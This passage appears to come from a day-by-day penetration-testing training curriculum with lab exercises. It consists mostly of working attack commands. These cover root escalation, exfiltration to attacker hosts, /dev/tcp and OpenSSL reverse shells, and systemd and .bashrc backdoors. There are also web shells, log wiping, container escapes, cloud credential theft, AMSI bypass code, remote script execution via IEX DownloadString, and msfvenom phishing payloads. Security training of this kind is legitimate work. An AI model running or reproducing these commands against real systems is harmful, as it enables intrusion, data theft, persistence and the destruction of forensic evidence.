# If (ALL, !root) /bin/bash
sudo -u#-1 /bin/bash  # CVE-2019-14287

# GTFOBins for sudo abuse
# https://gtfobins.github.io/

# 2. SUID binary exploitation
# Find custom SUID binaries
find / -perm -4000 -type f 2>/dev/null | grep -v "/bin\|/sbin\|/usr"

# Common SUID exploits
# nmap (old versions)
nmap --interactive
!sh

# find
find / -exec /bin/sh \; -quit

# vim
vim -c ':!/bin/sh'

# less
less /etc/passwd
!/bin/sh

# 3. Capabilities exploitation
# If python has cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If perl has cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# 4. Cron job exploitation
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/

# If script is writable
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/script.sh

# 5. Path exploitation
# If sudo allows running script without full path
echo '/bin/bash' > /tmp/script
chmod +x /tmp/script
export PATH=/tmp:$PATH
sudo script

# 6. Wildcard exploitation
# If cron runs: tar czf /backup/*.tar.gz *
# In writable directory:
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=sh\ shell.sh

# 7. Kernel exploits
# DirtyCow (CVE-2016-5195)
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password

# 8. Docker escape
# If user is in docker group
docker run -v /:/hostfs -it ubuntu chroot /hostfs bash

# 9. NFS no_root_squash
# (see earlier example)

# 10. Writable /etc/passwd
# If /etc/passwd is writable
openssl passwd -1 -salt xyz password
echo 'newroot:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot
```

**Challenge:**
1. Set up intentionally vulnerable Linux VM
2. Enumerate with LinPEAS
3. Identify 5 different privesc vectors
4. Exploit at least 3 to gain root
5. Write detailed methodology

---

### **Week 7: Post-Exploitation & Persistence**

#### **Day 41-42: Data Exfiltration & Covering Tracks**
```
Goal: Extract data and maintain stealth

Data Exfiltration Techniques:

# 1. Standard protocols
# SCP
scp sensitive_data.zip user@attacker-ip:/tmp/

# FTP
ftp attacker-ip
put sensitive_data.zip

# HTTP POST
curl -X POST -F "file=@sensitive_data.zip" http://attacker-ip/upload.php

# 2. DNS Exfiltration
# Split data into DNS queries
# Each subdomain contains base64-encoded data chunk
for i in $(cat data.txt | base64 | fold -w 32); do
    nslookup $i.attacker.com attacker-dns-server
done

# 3. ICMP Exfiltration
# Embed data in ICMP packets
# Use tools like: ptunnel, icmpsh

# 4. Encrypted channel
# OpenSSL reverse shell with encryption
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect attacker-ip:443 > /tmp/s

# 5. Cloud exfiltration
# Upload to Pastebin, GitHub Gist, etc.
curl -X POST -d "content=$(cat data.txt)" https://pastebin.com/api/api_post.php

# 6. Steganography
# Hide data in images
steghide embed -cf image.jpg -ef secret.txt

Covering Tracks:

# Clear command history
history -c
rm ~/.bash_history
ln -sf /dev/null ~/.bash_history

# Disable logging
service rsyslog stop  # Linux
wevtutil cl Security  # Windows
wevtutil cl System    # Windows

# Modify timestamps
touch -r reference_file target_file  # Match timestamps
touch -t 202301010000 file           # Set specific time

# Delete logs (Linux)
rm -rf /var/log/*
> /var/log/auth.log
> /var/log/syslog

# Delete logs (Windows)
wevtutil cl Application
wevtutil cl Security
wevtutil cl System

# Clear specific log entries (Windows)
wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text
# Then parse and delete specific entries

# Anti-forensics
# Overwrite deleted data
shred -vfz -n 10 sensitive_file.txt

# Fill free space (prevents recovery)
dd if=/dev/zero of=/fillfile bs=1M
rm /fillfile
```

**Lab:**
1. Set up data exfiltration server
2. Practice 3 different exfiltration methods
3. Clear tracks on compromised Linux VM
4. Clear tracks on compromised Windows VM
5. Verify logs were successfully modified

---

#### **Day 43-45: Persistence Mechanisms**
```
Goal: Maintain access to compromised systems

Linux Persistence:

# 1. SSH keys
mkdir -p /root/.ssh
echo "attacker-public-key" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 2. Cron jobs
# User crontab
(crontab -l ; echo "@reboot /tmp/backdoor.sh")| crontab -

# System cron
echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab

# 3. Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service

# 4. .bashrc modification
echo 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1 &' >> /root/.bashrc

# 5. Library injection
# Modify LD_PRELOAD
echo "/path/to/malicious.so" > /etc/ld.so.preload

# 6. Kernel module
# More advanced, requires kernel development knowledge

# 7. Web shell (if web server present)
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

Windows Persistence:

# 1. Registry Run keys
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# 2. Scheduled tasks
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru System

# 3. Services
sc create Backdoor binPath= "C:\backdoor.exe" start= auto
sc start Backdoor

# 4. WMI Event Subscription
# PowerShell Empire has excellent WMI persistence modules

# 5. DLL hijacking
# Place malicious DLL in application directory

# 6. Startup folder
copy backdoor.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

# 7. Golden Ticket (AD environment)
# After getting krbtgt hash
mimikatz.exe
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt

# 8. Skeleton Key (AD environment)
mimikatz.exe
privilege::debug
misc::skeleton

Advanced Persistence:

# Rootkit (Linux)
# Diamorphine (LKM rootkit)
# Hides processes, files, network connections

# Firmware persistence
# BIOS/UEFI implants (extremely advanced)

# Cloud persistence
# Add IAM users (AWS)
aws iam create-user --user-name backdoor
aws iam create-access-key --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**Lab:**
1. Implement 3 persistence mechanisms on Linux
2. Implement 3 persistence mechanisms on Windows
3. Reboot systems and verify persistence
4. Practice detection of your own persistence
5. Document cleanup procedures

---

### **Week 8: Network Attacks & Pivoting**

#### **Day 46-48: Man-in-the-Middle Attacks**
```
Goal: Intercept and manipulate network traffic

ARP Spoofing:

Understanding:
- ARP maps IP addresses to MAC addresses
- No authentication in ARP
- Can poison ARP cache to redirect traffic

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing with arpspoof
arpspoof -i eth0 -t victim-ip gateway-ip
arpspoof -i eth0 -t gateway-ip victim-ip

# ARP spoofing with Ettercap
ettercap -T -M arp:remote /victim-ip/ /gateway-ip/

# Capture traffic
wireshark  # Or
tcpdump -i eth0 -w capture.pcap

# Extract credentials
dsniff -i eth0
# Or parse pcap with tools like NetworkMiner

SSL/TLS Stripping:

# SSLstrip (downgrade HTTPS to HTTP)
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sslstrip -l 8080

# Modern alternative: mitmproxy
mitmproxy --mode transparent --showhost

DNS Spoofing:

# Ettercap DNS spoofing
# Edit /etc/ettercap/etter.dns
# Add: example.com A 192.168.1.50

ettercap -T -M arp:remote /victim-ip/ /gateway-ip/ -P dns_spoof

# Responder (LLMNR/NBT-NS/MDNS poisoning)
responder -I eth0 -wrf

DHCP Spoofing:

# Become rogue DHCP server
# Route traffic through attacker
yersinia dhcp -attack 2  # DHCP starvation
# Then start rogue DHCP server

IPv6 Attacks:

# IPv6 MITM (many networks forget to secure IPv6)
mitm6 -d domain.local
# Combine with ntlmrelayx for credential relay
```

**Lab:**
1. Set up 3-machine network (attacker, victim, router)
2. Perform ARP spoofing MITM
3. Capture HTTP credentials with Wireshark
4. Strip SSL with SSLstrip
5. Perform DNS spoofing attack

---

#### **Day 49-50: Advanced Pivoting & Tunneling**
```
Goal: Access internal networks through compromised hosts

Port Forwarding:

# SSH local port forwarding
ssh -L local-port:target-ip:target-port user@pivot-host

# SSH remote port forwarding
ssh -R pivot-port:target-ip:target-port user@pivot-host

# SSH dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@pivot-host
# Then configure proxychains
# Edit /etc/proxychains.conf
socks5 127.0.0.1 1080

# Use with tools
proxychains nmap -sT -Pn internal-target
proxychains msfconsole

Metasploit Pivoting:

# Add route through session
route add 10.10.10.0/24 1  # Session 1

# Or use autoroute
use post/multi/manage/autoroute
set SESSION 1
run

# Port forwarding
portfwd add -l 3389 -p 3389 -r internal-host

# SOCKS proxy
use auxiliary/server/socks_proxy
set VERSION 4a
run
# Configure proxychains, then use MSF through proxy

Chisel Tunneling:

# On attacker (server mode)
./chisel server -p 8000 --reverse

# On compromised host (client mode)
# Reverse tunnel
./chisel client attacker-ip:8000 R:8001:internal-host:80

# SOCKS proxy
./chisel client attacker-ip:8000 R:socks

Ligolo-ng (Modern, Fast):

# On attacker
./proxy -selfcert

# On compromised host
./agent -connect attacker-ip:11601 -ignore-cert

# In proxy interface
session  # List sessions
# Select session
start  # Start tunnel
# Add route on attacker
ip route add 10.10.10.0/24 dev ligolo

SSH Tunneling Techniques:

# Local forwarding (access internal service)
ssh -L 8080:internal-web:80 user@pivot

# Remote forwarding (expose attacker service to internal network)
ssh -R 8080:localhost:80 user@pivot

# Dynamic forwarding (SOCKS proxy)
ssh -D 1080 user@pivot

# Jump host
ssh -J pivot-host internal-host

# Reverse SSH tunnel (from compromised host to attacker)
ssh -R 2222:localhost:22 attacker-user@attacker-ip

# Persistent tunnel with autossh
autossh -M 0 -f -N -D 1080 user@pivot

VPN Pivoting:

# OpenVPN
# Set up OpenVPN server on compromised host
# Connect from attacker machine

# WireGuard (modern, faster)
# Configure WireGuard on both ends

Multiple Pivots (Daisy Chaining):

# Pivot 1: DMZ host
ssh -D 1080 user@dmz-host

# Configure proxychains for SOCKS 1080

# Pivot 2: Internal host (through first pivot)
proxychains ssh -D 1081 user@internal-host

# Now use 1081 for accessing deeper network
# Edit proxychains to use 1081
```

**Lab:**
1. Set up multi-tier network (Internet → DMZ → Internal)
2. Compromise DMZ host
3. Pivot to internal network using 3 different methods
4. Access internal web server from attacker machine
5. Perform scan of internal network through pivot

---

#### **Day 51-52: Wireless Attacks**
```
Goal: Compromise wireless networks

Monitor Mode:

# Enable monitor mode
airmon-ng check kill
airmon-ng start wlan0

# Verify
iwconfig

WPA/WPA2 Attacks:

# 1. Capture handshake
airodump-ng wlan0mon
# Note target: BSSID, channel
airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# In another terminal, deauth clients to force handshake
aireplay-ng --deauth 10 -a <BSSID> wlan0mon

# 2. Crack handshake
# Using aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Using hashcat (faster, GPU)
# Convert to hashcat format
cap2hccapx capture-01.cap output.hccapx
hashcat -m 2500 output.hccapx rockyou.txt

# Or with hcxpcapngtool (newer)
hcxpcapngtool -o hash.hc22000 capture.pcap
hashcat -m 22000 hash.hc22000 rockyou.txt

WPS Attacks:

# WPS PIN brute force
wash -i wlan0mon  # Find WPS-enabled networks
reaver -i wlan0mon -b <BSSID> -vv

# Pixie Dust attack (faster)
reaver -i wlan0mon -b <BSSID> -vv -K

Evil Twin Attack:

# 1. Create fake AP
airbase-ng -e "Free WiFi" -c 6 wlan0mon

# 2. Set up DHCP server
# Configure dnsmasq or dhcpd

# 3. Enable routing
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# 4. Capture credentials
# Use SSL stripping, phishing portal, etc.

Captive Portal Attack:

# Fluxion (automated evil twin with captive portal)
./fluxion.sh
# Follow prompts to create fake network and phishing page

WPA3 Attacks:

# Dragonblood vulnerabilities
# More resistant but still vulnerable to certain attacks

# Side-channel attacks
# Timing attacks on SAE handshake

Bluetooth Attacks:

# Bluez tools
hciconfig hci0 up
hcitool scan
sdptool browse <MAC>

# Bluesniff (proximity detection)
# Redfang (find hidden devices)
# Bluesnarfing (steal data)
# Bluebugging (control device)
```

**Lab:**
1. Set up wireless lab (router + clients)
2. Capture WPA2 handshake
3. Crack handshake with wordlist
4. Perform evil twin attack
5. Set up captive portal

---

## 🗓️ **MONTH 3: Specialization & Real-World Scenarios**

### **Week 9: Cloud Security & Container Escapes**

#### **Day 53-55: AWS Pentesting**
```
Goal: Identify and exploit cloud misconfigurations

AWS Enumeration:

# Configure AWS CLI
aws configure

# Enumerate IAM
aws iam get-user
aws iam list-users
aws iam list-roles
aws iam list-policies
aws iam get-account-authorization-details

# Enumerate S3
aws s3 ls
aws s3 ls s3://bucket-name
aws s3 sync s3://bucket-name /local/path

# Public S3 buckets
# Check for open buckets
aws s3 ls s3://company-name --no-sign-request
aws s3 cp s3://bucket-name/file.txt . --no-sign-request

# Enumerate EC2
aws ec2 describe-instances
aws ec2 describe-security-groups
aws ec2 describe-snapshots --owner-ids self

# Enumerate Lambda
aws lambda list-functions
aws lambda get-function --function-name function-name

# Enumerate RDS
aws rds describe-db-instances

# IMDS (Instance Metadata Service) exploitation
# From compromised EC2
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

# Using IMDS credentials
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

Privilege Escalation (AWS):

# Attach admin policy to current user
aws iam attach-user-policy --user-name current-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create new access key
aws iam create-access-key --user-name target-user

# Assume role
aws sts assume-role --role-arn arn:aws:iam::account-id:role/role-name --role-session-name test

Automated Tools:

# Scout Suite (multi-cloud security auditing)
python scout.py aws

# Pacu (AWS exploitation framework)
python pacu.py
# Inside Pacu
set_keys
whoami
run iam__enum_users_roles_policies_groups
run s3__download_bucket --bucket bucket-name

# CloudMapper (visualize AWS environment)
python cloudmapper.py collect --account account-name
python cloudmapper.py prepare --account account-name
python cloudmapper.py webserver
```

**Lab:**
1. Set up free-tier AWS account
2. Create intentionally vulnerable environment
3. Enumerate with Scout Suite
4. Find open S3 buckets
5. Exploit IMDS for credential theft

---

#### **Day 56-57: Docker & Kubernetes Exploitation**
```
Goal: Escape containers and compromise orchestration

Docker Enumeration:

# Check if inside container
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker

# Docker socket exposure
ls -la /var/run/docker.sock

Docker Escape Techniques:

# 1. Privileged container escape
# If container is privileged
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/attacker-ip/4444 0>&1" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 2. Docker socket abuse
# If /var/run/docker.sock is mounted
docker run -v /:/hostfs -it ubuntu chroot /hostfs bash

# 3. Exposed Docker API
# If Docker API is exposed
docker -H tcp://target-ip:2375 ps
docker -H tcp://target-ip:2375 exec -it container-id /bin/bash

# 4. Container breakout via kernel exploit
# Find kernel version
uname -a
# Search for appropriate exploit

# 5. Abusing capabilities
# If SYS_ADMIN capability
# Can mount host filesystem

Kubernetes Enumeration:

# Check if in K8s pod
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# Get service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Enumerate with kubectl
kubectl --server=https://kubernetes.default --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt get pods

Kubernetes Exploitation:

# 1. RBAC misconfigurations
# Check permissions
kubectl auth can-i --list

# 2. Exposed dashboard
# Access K8s dashboard without authentication

# 3. Pod escape to node
# If pod has hostPath volume
# Or if pod runs as privileged

# 4. Service account token abuse
# Use stolen token to access API server

# Automated K8s scanning
# kube-hunter
./kube-hunter.py --remote target-ip

# kubeletctl
kubeletctl scan rce --server target-ip
```

**Lab:**
1. Set up Docker environment
2. Create privileged container
3. Escape container to host
4. Set up Minikube (Kubernetes)
5. Exploit misconfigured K8s pod

---

#### **Day 58: API Security Testing**
```
Goal: Identify and exploit API vulnerabilities

API Reconnaissance:

# Find API endpoints
# Check robots.txt, sitemap.xml
# JavaScript files
# Burp Suite proxy

# Swagger/OpenAPI documentation
https://target.com/swagger.json
https://target.com/api/swagger
https://target.com/api-docs

# API versioning
/api/v1/
/api/v2/

API Testing Methodology:

# 1. Authentication bypass
# Missing auth on endpoints
# Weak JWT secrets
# API key in URL/headers

# JWT analysis
# jwt.io
# jwt_tool

jwt_tool <token>
jwt_tool <token> -C -d wordlist.txt  # Crack secret

# 2. Authorization issues
# IDOR (Insecure Direct Object Reference)
GET /api/user/123/profile  # Try other IDs

# Horizontal privilege escalation
# Access other users' data

# Vertical privilege escalation
# Access admin endpoints as regular user

# 3. Mass assignment
# Send extra parameters
POST /api/user/profile
{
  "name": "User",
  "is_admin": true  # Try to set admin
}

# 4. Rate limiting
# Check if rate limits exist
# Brute force if no limits

# 5. Injection attacks
# SQL injection in API parameters
# Command injection
# NoSQL injection

# 6. Excessive data exposure
# API returns more data than needed
# Sensitive data in responses

# GraphQL specific
# Introspection query
query { __schema { types { name fields { name } } } }

# Batch queries (bypass rate limiting)
# Aliases

Automated API Testing:

# Postman collection scanning
# Import API collection
# Use Newman for automated testing

# OWASP ZAP API scan
zap-cli quick-scan --spider --ajax-spider -r report.html https://api.target.com

# Burp Suite extensions
# Autorize (authorization testing)
# JSON Web Tokens
# InQL (GraphQL)

# Arjun (parameter discovery)
arjun -u https://api.target.com/endpoint
```

**Lab:**
1. Set up vulnerable API (vAPI, crAPI)
2. Perform full API assessment
3. Exploit JWT misconfiguration
4. Find and exploit IDOR vulnerability
5. Test GraphQL introspection

---

### **Week 10: Mobile & IoT Security**

#### **Day 59-61: Android Pentesting**
```
Goal: Analyze and exploit Android applications

Setup Environment:

# Android Studio + SDK
# ADB (Android Debug Bridge)
adb devices
adb shell

# Genymotion (Android emulator)
# Frida (dynamic instrumentation)
pip install frida-tools

Static Analysis:

# 1. Decompile APK
# JADX
jadx-gui app.apk

# Or command line
jadx app.apk -d output/

# APKTool (get smali code)
apktool d app.apk -o output/

# 2. Analyze manifest
# Check AndroidManifest.xml
# Look for:
# - Exported components
# - Permissions
# - Backup enabled
# - Debuggable flag

# 3. Search for secrets
# API keys, credentials
grep -r "api_key" output/
grep -r "password" output/

# 4. Deobfuscation
# If proguard is used, code is obfuscated

Dynamic Analysis:

# 1. SSL pinning bypass
# Frida script
frida -U -f com.app.package -l ssl-bypass.js --no-pause

# 2. Root detection bypass
# Frida, Xposed modules

# 3. Intercept traffic
# Burp Suite proxy
adb shell settings put global http_proxy 192.168.1.50:8080

# 4. Hook functions with Frida
frida -U -f com.app.package
# In Frida console
Java.perform(function() {
  var Activity = Java.use("com.app.MainActivity");
  Activity.sensitiveMethod.implementation = function() {
    console.log("Method called!");
    return this.sensitiveMethod();
  };
});

Common Vulnerabilities:

# 1. Insecure data storage
# Check /data/data/com.app.package/
adb shell
cd /data/data/com.app.package
find . -type f

# Shared preferences
cat shared_prefs/*.xml

# SQLite databases
sqlite3 databases/app.db
.tables
SELECT * FROM users;

# 2. Insecure communication
# No SSL/TLS
# Certificate validation disabled

# 3. Hardcoded secrets
# Credentials in code
# API keys

# 4. Weak cryptography
# Use of MD5, SHA1
# ECB mode
# Hardcoded keys

# 5. Intent-based attacks
# Exported activities
adb shell am start -n com.app.package/.HiddenActivity
adb shell am start -a android.intent.action.VIEW -d "app://sensitive"

# 6. WebView vulnerabilities
# JavaScript enabled
# File access enabled
# addJavascriptInterface

Automated Tools:

# MobSF (Mobile Security Framework)
# Upload APK for automated analysis

# AndroBugs
python androbugs.py -f app.apk

# QARK (Quick Android Review Kit)
qark --apk app.apk
```

**Lab:**
1. Download vulnerable Android app (DIVA, InsecureBankv2)
2. Perform static analysis with JADX
3. Extract hardcoded secrets
4. Bypass SSL pinning with Frida
5. Intercept and modify API requests

---

#### **Day 62-63: iOS Pentesting**
```
Goal: Analyze and exploit iOS applications

Setup Environment:

# Jailbroken iOS device (required for full testing)
# Or iOS Simulator

# Tools:
# - Frida
# - Objection
# - Cycript
# - Class-dump
# - Hopper Disassembler

Static Analysis:

# 1. Extract IPA
# Get from iTunes backup or jailbroken device

# 2. Unzip IPA
unzip app.ipa

# 3. Analyze binary
# class-dump (get class information)
class-dump -H Payload/App.app/App -o headers/

# 4. Search for secrets
grep -r "api" Payload/
strings Payload/App.app/App | grep -i key

# 5. Analyze plist files
plutil -p Payload/App.app/Info.plist

Dynamic Analysis:

# 1. Frida/Objection
frida -U -f com.app.package
objection --gadget com.app.package explore

# 2. SSL pinning bypass
objection --gadget com.app.package explore
ios sslpinning disable

# 3. Jailbreak detection bypass
objection --gadget com.app.package explore
ios jailbreak disable

# 4. Keychain dumping
objection --gadget com.app.package explore
ios keychain dump

# 5. Runtime manipulation
# Cycript
cycript -p App
# Inside Cycript
choose(ClassName)  # Find instances
# Modify properties/call methods

Common Vulnerabilities:

# 1. Insecure data storage
# Keychain
# Plist files
# Core Data
# UserDefaults

# Check application data
# /var/mobile/Containers/Data/Application/<UUID>/

# 2. Binary protections
# Check if PIE, Stack canaries enabled
otool -hv Payload/App.app/App | grep PIE
otool -hv Payload/App.app/App | grep STACK

# 3. Insecure communication
# App Transport Security bypassed

# 4. Code injection
# URL schemes
xcrun simctl openurl booted "app://path?param=value"

Automated Tools:

# MobSF
# Upload IPA

# Needle (iOS security testing framework)
# Automated testing on jailbroken device
```

**Lab:**
1. Get vulnerable iOS app (DVIA-v2)
2. Extract and analyze IPA
3. Dump classes with class-dump
4. Use Objection for runtime analysis
5. Bypass jailbreak detection

---

#### **Day 64: IoT Exploitation**
```
Goal: Compromise IoT devices

IoT Reconnaissance:

# 1. Shodan searches
# Find exposed IoT devices
shodan search "default password"
shodan search "webcam"
shodan search "raspberry pi"

# 2. Network scanning
# Find IoT devices on local network
nmap -sV -p- 192.168.1.0/24 --open

# 3. Identify device
# Check web interface
# Default credentials

Firmware Analysis:

# 1. Obtain firmware
# Manufacturer website
# UART/JTAG extraction
# Sniff update process

# 2. Extract filesystem
binwalk -e firmware.bin
# Or
unsquashfs filesystem.squashfs

# 3. Analyze filesystem
# Look for:
# - Hardcoded credentials
# - Private keys
# - Configuration files

grep -r "password" _firmware.extracted/
grep -r "-----BEGIN" _firmware.extracted/

# 4. Emulate firmware
# Firmware Analysis Toolkit (FAT)
./fat.py firmware.bin

# Or QEMU
qemu-system-arm -M versatilepb -kernel kernel.img -hda rootfs.img

Hardware Attacks:

# 1. UART access
# Connect to UART pins
# Use USB-to-UART adapter
screen /dev/ttyUSB0 115200

# 2. JTAG debugging
# Connect JTAG debugger
# Dump firmware
# Debug

# 3. Side-channel attacks
# Power analysis
# Electromagnetic analysis

Common IoT Vulnerabilities:

# 1. Default credentials
admin:admin
root:root
admin:password

# 2. Weak authentication
# No auth on web interface
# Hard-coded API keys

# 3. Outdated software
# Old Linux kernel
# Vulnerable services

# 4. Insecure updates
# No signature verification
# Unencrypted updates
# MITM possible

# 5. Exposed debugging interfaces
# Telnet
# SSH with weak credentials
# UART console

Exploitation:

# Command injection
# Via web interface parameters
# Via API endpoints

# Buffer overflows
# In custom services
# In web server

# Authentication bypass
# Direct URL access
# Session manipulation
```

**Lab:**
1. Set up IoT device (Raspberry Pi, Arduino)
2. Perform network reconnaissance
3. Access UART console
4. Extract and analyze filesystem
5. Identify and exploit vulnerability

---

### **Week 11: Advanced Topics & Evasion**

#### **Day 65-67: Antivirus/EDR Evasion**
```
Goal: Bypass modern security solutions

Understanding Detection:

Types of detection:
├── Signature-based (hash, pattern)
├── Heuristic (behavior analysis)
├── Sandboxing (execute in isolated environment)
└── AI/ML-based (anomaly detection)

Signature Evasion:

# 1. Code obfuscation
# Python example
import base64
exec(base64.b64decode("cHJpbnQoJ0hlbGxvJyk="))

# PowerShell
$a=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGUtSG9zdCAiSGVsbG8i"))
iex $a

# 2. Encryption
# Encrypt payload, decrypt at runtime

# 3. Polymorphism
# Change code structure each time

# 4. Change entropy
# Lower entropy to avoid suspicion

Behavioral Evasion:

# 1. Sleep before execution
Start-Sleep -Seconds 300  # 5 minutes

# 2. User interaction check
# Only execute after mouse movement/clicks

# 3. Environment checks
# Detect sandbox/VM
# Check:
# - Number of CPU cores
# - Amount of RAM
# - Disk size
# - Running processes
# - Registry keys (VMware, VirtualBox)

if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { Exit }

# 4. Time-based checks
$startTime = Get-Date
Start-Sleep -Seconds 1
$endTime = Get-Date
if (($endTime - $startTime).TotalSeconds -lt 0.9) { Exit }  # Sandbox detection

In-Memory Execution:

# PowerShell
# Download and execute without touching disk
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# Reflective DLL injection
# Load DLL directly into memory

# Process injection
# Inject code into legitimate process

EDR Bypass Techniques:

# 1. Direct syscalls
# Bypass user-mode hooks

# 2. Unhooking
# Remove EDR hooks from NTDLL

# 3. PPID spoofing
# Make malicious process appear as child of legitimate process

# 4. Process hollowing
# Start legitimate process in suspended state
# Replace memory with malicious code

# 5. Token manipulation
# Steal token from legitimate process

Modern Tools:

# Donut (shellcode generator)
donut -f payload.exe -o shellcode.bin

# ScareCrow (payload obfuscation)
ScareCrow -I payload.bin -domain microsoft.com

# Cobalt Strike (commercial)
# Built-in evasion techniques
# Malleable C2 profiles

AMSI Bypass:

# Anti-Malware Scan Interface bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Or
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

C2 Infrastructure:

# Malleable C2 profiles
# Customize traffic patterns to blend in
# Mimic legitimate services (Gmail, Dropbox, etc.)

# Domain fronting
# Use CDN to hide true C2 server

# DNS tunneling
# Exfiltrate data via DNS queries

# HTTPS C2
# Encrypted communication
# Valid SSL certificates
```

**Lab:**
1. Create simple payload
2. Test against Windows Defender
3. Apply obfuscation techniques
4. Bypass AMSI
5. Use in-memory execution
6. Verify evasion success

---

#### **Day 68-70: Red Team Operations & C2**
```
Goal: Conduct full red team engagement

Red Team Methodology:

1. Reconnaissance (external)
2. Initial compromise
3. Establish foothold
4. Escalate privileges
5. Internal reconnaissance
6. Lateral movement
7. Achieve objectives
8. Maintain persistence
9. Cover tracks
10. Report findings

Command & Control (C2):

# Cobalt Strike (commercial, $5,900/year)
# - Industry standard
# - Excellent documentation
# - Built-in evasion

# Alternatives:
# Metasploit Framework
# Empire/Starkiller
# Covenant (.NET)
# Mythic (modular)
# Sliver (Go-based, open source)

Setting up Sliver C2:

# On teamserver
# Download from GitHub
./sliver-server

# Generate implant
generate --mtls 192.168.1.100 --save /tmp/implant.exe
# Or
generate --http https://192.168.1.100 --save /tmp/implant.exe

# Start listener
mtls --lhost 192.168.1.100
# Or
http --lhost 192.168.1.100

# Interact with session
use <session-id>
shell
execute-assembly /path/to/Rubeus.exe
seatbelt -group=all

Operational Security (OpSec):

# 1. Use VPS/redirectors
# Don't expose actual C2 server

# 2. Rotate infrastructure
# Change domains, IPs regularly

# 3. Valid SSL certificates
# Use Let's Encrypt

# 4. Categorize domains
# Register domain in advance
# Get it categorized (shopping, news, etc.)

# 5. Time-based operations
# Only operate during business hours (blend in)

# 6. Bandwidth throttling
# Don't exfiltrate large amounts suddenly

# 7. Use living-off-the-land binaries
# PowerShell, WMI, certutil, etc.

Social Engineering:

# Phishing campaigns
# GoPhish (open source)
./gophish

# Create landing page
# Clone legitimate site
# Add credential harvesting

# Spear phishing
# Targeted emails
# Weaponized documents

# Macro-enabled documents
# msfvenom VBA payload
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f vba

# HTA payload
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f hta-psh -o payload.hta

Physical Access:

# USB drop attacks
# Bash Bunny, USB Rubber Ducky

# Badge cloning
# Proxmark3

# Lock picking
# Practice kit

Full Engagement Simulation:

# Day 1-2: External reconnaissance
# - OSINT
# - Network mapping
# - Vulnerability scanning

# Day 3-5: Initial compromise
# - Phishing campaign
# - Exploit public-facing services
# - Social engineering

# Day 6-10: Internal operations
# - Privilege escalation
# - Domain enumeration
# - Lateral movement
# - Credential harvesting

# Day 11-14: Objectives
# - Access sensitive data
# - Domain dominance
# - Exfiltration simulation

# Day 15: Reporting
# - Executive summary
# - Technical details
# - Recommendations
# - Timeline of compromise
```

